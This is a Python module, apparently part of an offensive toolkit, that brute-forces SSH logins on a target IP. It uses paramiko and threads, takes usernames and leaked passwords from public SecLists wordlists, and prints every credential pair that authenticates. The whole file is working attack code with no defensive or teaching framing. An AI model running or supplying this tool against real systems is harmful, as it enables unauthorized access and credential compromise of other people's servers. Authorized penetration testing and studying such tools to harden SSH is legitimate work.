import paramiko
import threading
from ...utils import getFileContent

NUMBER_OF_THREADS = 1
USERS_FILE_NAME = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt'
PASSWORDS_FILE_NAME = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-30.txt'

""" Bruteforce the target ip with one user and multiple passwords. """
def bruteForceForOneUser(threadNumber, ip, user, passwords):
    for password in passwords:  # For each password
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(ip, username=user.strip(), password=password.strip())   # Connect to the target
            print(f"[✓] [Thread {threadNumber}] Successfully connected with {user.strip()}:{password.strip()}")
            ssh.close()
        except paramiko.AuthenticationException:
            print(f"[X] [Thread {threadNumber}] Authentication Failure (Wrong user or password) - {user.strip()}:{password.strip()}")
        except paramiko.SSHException as e:
            print(f"[X] [Thread {threadNumber}] SSH connection failed - {user.strip()}:{password.strip()} : {e}")
        except Exception as e:
            print(f"[X] [Thread {threadNumber}] Failed to connect - {user.strip()}:{password.strip()} : {e}")

""" Yield to return successfully chunk from the provided list. """
def createChunks(myList, numOfChunks):
    for i in range(0, len(myList), numOfChunks):
        yield myList[i:i + numOfChunks]

""" Bruteforce with ip, threads (default 1), usersFileName (default 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt'), passwordsFileName (default 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-30.txt') provided. """
def bruteforce(ip, threads = NUMBER_OF_THREADS, usersFileName = USERS_FILE_NAME, passwordsFileName =PASSWORDS_FILE_NAME):
    if not ip:
        raise ValueError("[X] ip not provided")
    print(f"[INFO] BruteForce on target {ip} using {threads} thread(s)...")

    users = getFileContent(usersFileName)  # Get users
    passwords = getFileContent(passwordsFileName) # Get passwords
    threadsPasswordsList = list(createChunks(passwords, (len(passwords) // threads)))   # create a list of passwords chunks
    if (len(threadsPasswordsList) > threads):   # if (len(passwords) / threads) don't return an int, This create a last chunk
        threadsPasswordsList[0].extend(threadsPasswordsList[-1]) # add the last chunk into the first chunk
        threadsPasswordsList.remove(threadsPasswordsList[-1]) # remove the last chunk
    for user in users:  # for each user
        threadsList = []
        for i in range(threads):    # create all the threads
            thread = threading.Thread(target=bruteForceForOneUser, args=(i+1, ip, user, threadsPasswordsList[i]))
            threadsList.append(thread)
            thread.start()
        
        for thread in threadsList:  # Wait until all the threads finished
            thread.join()

    print("[INFO] BruteForce finished.")